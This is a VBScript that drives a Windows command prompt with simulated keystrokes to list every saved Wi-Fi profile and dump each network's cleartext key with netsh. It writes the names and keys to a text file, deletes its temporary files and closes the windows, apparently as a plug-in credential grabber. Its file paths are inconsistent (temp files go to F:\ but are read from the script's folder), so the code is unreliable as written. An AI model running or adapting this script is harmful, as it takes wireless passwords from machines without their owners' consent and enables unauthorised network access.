Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Define the Notepad file name to store Wi-Fi names and keys
Dim notepadFileName
notepadFileName = "wifi_credentials.txt"

' Create the object for sending keys
Set x = CreateObject("WScript.Shell")

' Open the Command Prompt
x.SendKeys "^{ESC}"
WScript.Sleep(1000)
x.SendKeys "cmd"
WScript.Sleep(500)
x.SendKeys "{ENTER}"
WScript.Sleep(2000)

' Run the "netsh wlan show profiles" command and save output to a temporary file
x.SendKeys "netsh wlan show profiles > F:\temp_profiles.txt"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(1000)

' Open the Command Prompt again to extract Wi-Fi profile names
x.SendKeys "type temp_profiles.txt | find ""All User Profile"" > F:\profiles.txt"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(500)

' Read profiles from "profiles.txt" and get their keys
strScriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
strProfilesFile = objFSO.BuildPath(strScriptDir, "profiles.txt")
strOutputFile = objFSO.BuildPath(strScriptDir, notepadFileName)

' Create or overwrite the output file
set outputFile = objFSO.CreateTextFile(strOutputFile, True)

If objFSO.FileExists(strProfilesFile) Then
    Set profilesFile = objFSO.OpenTextFile(strProfilesFile, 1)
    
    ' Loop through each profile name and get the Wi-Fi password (if available)
    Do Until profilesFile.AtEndOfStream
        line = profilesFile.ReadLine()
        If InStr(line, ":") > 0 Then
            wifiName = Trim(Split(line, ":")(1))
            
            ' Retrieve the key for the current Wi-Fi profile
            Set objExec = objShell.Exec("cmd /c netsh wlan show profiles """ & wifiName & """ key=clear")
            WScript.Sleep(1000)
            
            Do Until objExec.StdOut.AtEndOfStream
                outputLine = objExec.StdOut.ReadLine()
                
                ' Look for the key line
                If InStr(outputLine, "Key Content") > 0 Then
                    key = Trim(Split(outputLine, ":")(1))
                    outputFile.WriteLine("Wi-Fi: " & wifiName & " | Key: " & key)
                End If
            Loop
        End If
    Loop
    
    profilesFile.Close
Else
    WScript.Echo "Profiles file not found."
End If

outputFile.Close

x.SendKeys "exit"
WScript.Sleep(100)
x.SendKeys"{ENTER}"
WScript.Sleep(100)

' Clean up temporary files
objFSO.DeleteFile "temp_profiles.txt"
objFSO.DeleteFile "profiles.txt"

' Open the Notepad file with stored Wi-Fi credentials
objShell.Run "notepad.exe " & strOutputFile
WScript.Sleep(2000)

' Paste the contents into Notepad (Ctrl+V) and save (Ctrl+S)
x.SendKeys "^s"
WScript.Sleep(100)
x.SendKeys "%{F4}"
WScript.Sleep(1000)